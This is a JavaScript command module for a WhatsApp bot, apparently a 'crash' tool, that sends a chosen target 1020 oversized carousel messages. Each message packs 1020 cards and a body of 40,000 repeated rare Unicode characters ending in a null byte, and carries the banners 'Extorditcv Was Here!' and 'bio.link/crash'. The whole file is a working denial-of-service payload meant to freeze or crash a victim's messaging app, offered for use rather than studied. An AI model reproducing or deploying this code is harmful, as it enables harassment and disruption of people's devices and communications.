const {
    quote
} = require("@mengkodingan/ckptw");

module.exports = {
    name: "carousel",
    category: "unknown",
    permissions: {
        owner: true
    },
    code: async (ctx) => {
        let args = ctx.args[0]
	let target = args

        async function Carousel(target) {
    for (let i = 0; i < 1020; i++) {
        try {
            let push = [];
            for (let i = 0; i < 1020; i++) {
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: '*Extorditcv Was Here!*',
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                            fileLength: "10840",
                            height: 10,
                            width: 10,
                            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1721344123",
                            jpegThumbnail: ""
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
                });
            }

            const carousel = generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}ExtorditcvExtorditcvExtorditcvExtorditcv\n\u0000` }),
                            footer: proto.Message.InteractiveMessage.Footer.create({ text: "About Me: bio.link/crash" }),
                            header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
                        })
                    }
                }
            }, {});

            await ctx.relayMessage(target, carousel.message, {
                participant: { jid: target }
            });

        } catch (err) {
            console.error("Error in Fkod:", err);
        }
    }
}


    }
};
